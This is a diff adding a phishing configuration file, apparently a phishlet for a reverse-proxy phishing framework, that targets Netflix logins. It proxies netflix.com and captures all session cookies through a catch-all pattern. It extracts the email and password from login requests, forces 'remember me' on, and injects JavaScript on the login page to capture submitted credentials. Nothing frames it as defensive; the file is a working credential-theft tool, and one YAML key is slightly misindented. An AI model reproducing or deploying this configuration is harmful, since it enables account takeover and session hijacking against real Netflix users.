@@ -1,0 +1,58 @@
+author: '@longwu'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'netflix.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'netflix.com', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'netflix.com', orig_sub: '', domain: 'netflix.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.netflix.com', orig_sub: 'www', domain: 'netflix.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.netflix.com'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/'
+  - '/*'
+
+  credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/login'
+    search:
+      - {key: 'email', search: '.*'}
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'rememberMe', value: 'true'}
+    type: 'post'
+
+js_inject:
+  - trigger_domains: ["www.netflix.com"]
+    trigger_paths: ["/login"]
+    trigger_params: []
+    script: |  
+      function onclickListener(){
+        var submit = document.querySelectorAll('button[type="submit"]')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        submit.addEventListener("click", sendPass);
+        return;
+      }
+      function sendPass(){
+        var email = document.getElementsByName("email")[0].value;
+        var password = document.getElementsByName("password")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/login', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("email="+encodeURIComponent(email)+"&password="+encodeURIComponent(password));
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 1000); 
